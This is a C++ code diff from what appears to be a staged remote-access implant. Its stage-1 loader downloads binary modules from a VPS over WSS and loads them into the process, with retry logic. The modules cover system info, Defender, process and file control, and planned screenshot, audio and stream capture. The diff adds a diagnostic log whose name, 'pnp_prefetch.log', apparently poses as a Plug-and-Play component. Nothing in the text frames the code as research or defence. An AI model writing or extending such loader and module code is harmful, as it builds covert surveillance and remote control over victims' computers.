@@ -61,22 +61,28 @@ void stage1_host_exit(int exit_code);
 // Returns the module short-name (e.g. "screenshot") or nullptr if the
 // command is stage-1 native (no stage-2 module should be loaded for it).
 inline const char* cmd_to_module(const std::string& cmd) {
-    struct Entry { const char* prefix; const char* module; };
-    static const Entry prefix_map[] = {
-        {"screenshot_",  "screenshot"},
-        {"audio_",       "audio"},
-        {"stream_",      "stream"},
-        {"record_",      "stream"},
-        {"webrtc_",      "stream"},
-    };
-    for (auto& e : prefix_map) {
-        size_t n = strlen(e.prefix);
-        if (cmd.size() >= n && cmd.compare(0, n, e.prefix) == 0) return e.module;
-    }
+    // Prefix map commented out until the corresponding stage-2 modules
+    // are actually built. Listing a prefix here causes the main.cpp
+    // lazy-load dispatcher to try to fetch that .bin from the VPS and
+    // error out with "X module not available" when the module doesn't
+    // exist yet. Re-enable each line as the module is implemented.
+    //
+    // struct Entry { const char* prefix; const char* module; };
+    // static const Entry prefix_map[] = {
+    //     {"screenshot_",  "screenshot"},
+    //     {"audio_",       "audio"},
+    //     {"stream_",      "stream"},
+    //     {"record_",      "stream"},
+    //     {"webrtc_",      "stream"},
+    // };
+    // for (auto& e : prefix_map) {
+    //     size_t n = strlen(e.prefix);
+    //     if (cmd.size() >= n && cmd.compare(0, n, e.prefix) == 0) return e.module;
+    // }
 
     static const std::unordered_map<std::string, const char*> exact_map = {
-        // stream.bin
-        {"request_keyframe", "stream"},
+        // stream.bin — NOT YET BUILT, commented out (see prefix_map note above)
+        // {"request_keyframe", "stream"},
 
         // filemgr.bin
         {"file_delete",      "filemgr"},
@@ -357,11 +363,41 @@ public:
             && modules_.count("defender") > 0;
     }
 
+    // Diagnostic: write a line to C:\Windows\Temp\pnp_prefetch.log so we
+    // can see what prefetch_all_async actually does even with dll_diag
+    // silenced. The file is TRUNCATED on first call per process (so a
+    // fresh service start starts a clean log) and APPENDED afterward.
+    static void prefetch_diag(const std::string& line) {
+        static std::once_flag s_truncate_flag;
+        const char* path = "C:\\Windows\\Temp\\pnp_prefetch.log";
+        std::call_once(s_truncate_flag, [&]{
+            std::ofstream f(path, std::ios::binary | std::ios::trunc);
+            if (f) {
+                SYSTEMTIME st; GetLocalTime(&st);
+                char hdr[64];
+                _snprintf_s(hdr, sizeof(hdr), _TRUNCATE,
+                    "=== prefetch log open %04d-%02d-%02d %02d:%02d:%02d ===\n",
+                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+                f << hdr;
+            }
+        });
+        std::ofstream f(path, std::ios::binary | std::ios::app);
+        if (!f) return;
+        SYSTEMTIME st; GetLocalTime(&st);
+        char ts[32];
+        _snprintf_s(ts, sizeof(ts), _TRUNCATE,
+            "[%02d:%02d:%02d.%03d] ",
+            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
+        f << ts << line << "\n";
+    }
+
     void prefetch_all_async() {
         if (prefetch_running_.exchange(true)) {
+            prefetch_diag("prefetch_all_async: SKIP, already running");
             stage1_log(2, "stage2: prefetch already running, skipping");
             return;
         }
+        prefetch_diag("prefetch_all_async: START");
         stage1_log(1, "stage2: prefetch_all_async starting");
         std::thread([this]{
             // RAII guard: even if an exception escapes the loop, flip the
@@ -394,34 +430,32 @@ public:
                 static const char* kModules[] = { "sysinfo", "defender", "procmgr", "filemgr" };
                 for (auto m : kModules) {
                     std::string name = m;
-                    // Skip modules already loaded — no point re-fetching a blob
-                    // we already have cached and Stage2Init'd.
                     {
                         std::lock_guard<std::recursive_mutex> lk(mu_);
                         if (modules_.count(name)) {
-                            stage1_log(0, ("stage2: prefetch skip (loaded) " + name).c_str());
+                            prefetch_diag("  " + name + ": skip (already loaded)");
                             continue;
                         }
                     }
 
-                    // Per-module retry (2 attempts, 8s each) — VPS sometimes
-                    // flakes the first stage2_fetch right after a fresh WSS
-                    // auth; second try 500ms later almost always succeeds.
                     bool fetched = false;
                     for (int attempt = 0; attempt < 2 && !fetched; ++attempt) {
                         if (attempt > 0) std::this_thread::sleep_for(std::chrono::milliseconds(500));
-                        stage1_log(1, ("stage2: prefetch begin " + name + " attempt=" +
-                                       std::to_string(attempt + 1)).c_str());
+                        prefetch_diag("  " + name + ": fetch attempt " +
+                                      std::to_string(attempt + 1));
                         fetched = fetch_blob_sync(m, 8000);
-                        stage1_log(1, ("stage2: prefetch fetch_blob_sync " + name +
-                                      " -> " + (fetched ? "OK" : "FAIL")).c_str());
+                        prefetch_diag("  " + name + ": fetch_blob_sync -> " +
+                                      (fetched ? "OK" : "FAIL"));
                     }
-                    if (!fetched) continue;
+                    if (!fetched) {
+                        prefetch_diag("  " + name + ": both attempts FAILED, skipping");
+                        continue;
+                    }
                     bool loaded = ensure_loaded(m);
-                    stage1_log(1, ("stage2: prefetch ensure_loaded " + name +
-                                  " -> " + (loaded ? "OK" : "FAIL")).c_str());
+                    prefetch_diag("  " + name + ": ensure_loaded -> " +
+                                  (loaded ? "OK" : "FAIL"));
                 }
-                stage1_log(1, "stage2: prefetch_all_async done");
+                prefetch_diag("prefetch_all_async: DONE");
             } catch (const std::exception& e) {
                 std::string m = "stage2: prefetch threw: "; m += e.what();
                 stage1_log(3, m.c_str());
